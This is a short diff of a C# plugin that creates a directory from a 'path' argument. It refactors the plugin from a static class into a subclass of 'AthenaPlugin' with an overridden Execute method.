@@ -3,18 +3,17 @@ using System;
 using System.Collections.Generic;
 using System.IO;
 
-namespace Plugin
+namespace Plugins
 {
-    public static class mkdir
+    public class Plugin : AthenaPlugin
     {
-
-        public static void Execute(Dictionary<string, object> args)
+        public override void Execute(Dictionary<string, object> args)
         {
             try
             {
                 if (args.ContainsKey("path"))
                 {
-                    DirectoryInfo dir = Directory.CreateDirectory(((string)args["path"]).Replace("\"",""));
+                    DirectoryInfo dir = Directory.CreateDirectory(((string)args["path"]).Replace("\"", ""));
 
                     PluginHandler.AddResponse(new ResponseResult
                     {
